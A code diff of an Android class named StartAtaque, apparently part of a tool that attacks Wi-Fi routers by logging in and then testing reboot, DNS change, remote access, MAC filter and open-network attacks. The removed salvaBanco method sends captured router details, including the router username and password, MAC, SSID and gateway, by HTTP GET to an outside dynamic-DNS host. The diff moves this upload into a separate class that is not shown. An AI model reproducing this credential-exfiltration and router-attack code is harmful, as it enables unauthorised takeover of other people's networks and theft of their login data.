@@ -5,7 +5,6 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.UnsupportedEncodingException;
-import java.net.MalformedURLException;
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
@@ -61,9 +60,6 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 	private boolean mConectou;
 	
 	private int mCountAtaques; 
-	
-	private String urlSalvaBanco;
-	private String urlInsereDado = "http://pedrofreitas.ddns.net/insereinfo.php?";	
 
 	private CookieStore cookieStore;
 	private List<Cookie> cookies;
@@ -97,7 +93,7 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 	
 	@Override
 	protected Integer doInBackground(Void... params) {
-		android.os.Debug.waitForDebugger();	
+//		android.os.Debug.waitForDebugger();	
 		
 		Ataque auxAtaque = mListAtaque.get(mCountAtaques);		
 
@@ -390,12 +386,11 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 //				mDadoDao.getAll();
 				
 				Dado auxDado = mDadoDao.getDadoWithId(mIdDadoAtaque);
-				salvaBanco(auxDado);	
+				
+				new SalvaBanco(mContext, auxDado, it).execute();
+				
 				mProgress.setMessage("Concluído");
 				mProgress.dismiss();
-				
-				it.putExtra("Dado", auxDado);
-				mContext.startActivity(it);
 				
 			} else {
 				//Nao foi possivel logar, tenta outro ataque
@@ -409,43 +404,5 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 		}			
 	}
 	
-	public void salvaBanco(Dado auxDado) {	
-		if(NetworkUtil.isWiFiConnected(mContext)) {
-			try {
-				urlSalvaBanco = urlInsereDado + "ip=" + auxDado.getIp() + "&gateway=" + auxDado.getGateway() + "&mac=" + auxDado.getMac() + "&ssid=" + auxDado.getSsid().replaceAll("\"",  "") + "&operadora=" + auxDado.getOperadora() + 
-								"&data=" + auxDado.getData().replace(" ", "_") + "&fabricante_modelo=" + auxDado.getFabricante_modelo().replace(" ", "_") + "&usuario=" + auxDado.getUsuario().replace(" ", "_") + "&senha=" + auxDado.getSenha().replace(" ", "_") + 
-								"&reboot_ataque=" + auxDado.getReboot_ataque() + "&dns_ataque=" + auxDado.getDns_ataque() + "&acesso_remoto_ataque=" + auxDado.getAcesso_remoto_ataque() + 
-								"&filtro_mac_ataque=" +	auxDado.getFiltro_mac_ataque() + "&abrir_rede_ataque=" + auxDado.getAbrir_rede_ataque();
-				
-				Log.i("URL_SALVA", urlSalvaBanco.toString());		
-				
-				HttpClient httpClient = new DefaultHttpClient();
-				HttpGet httpGet = new HttpGet(urlSalvaBanco);
-				
-				HttpResponse httpResponse = httpClient.execute(httpGet);
-				
-				Log.i("RESPONSE_STATUS_SALVA", httpResponse.getStatusLine() + "");
-				
-				BufferedReader in = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
-				String line;
-				StringBuffer response = new StringBuffer();
-				
-				while((line = in.readLine()) != null) {
-					response.append(line);
-				}
-				in.close();
-				
-				Log.i("CONEXAO_SALVA", response.toString());		
-				
-			} catch (MalformedURLException e) {
-				Log.e("ERR_SALVAR", "MalformedURLException", e);
-			} catch (IOException e) {
-				Log.e("ERR_SALVAR", "IOException", e);
-			}		
-			Log.i("DADO_SALVO", auxDado.toString());
-		} else {
-			Log.i("ERR_DADO_SALVO", "Nao foi possivel salvar o dado no ws por nao existir uma conexao wifi ativa");
-		}
-	}
-	
+		
 }
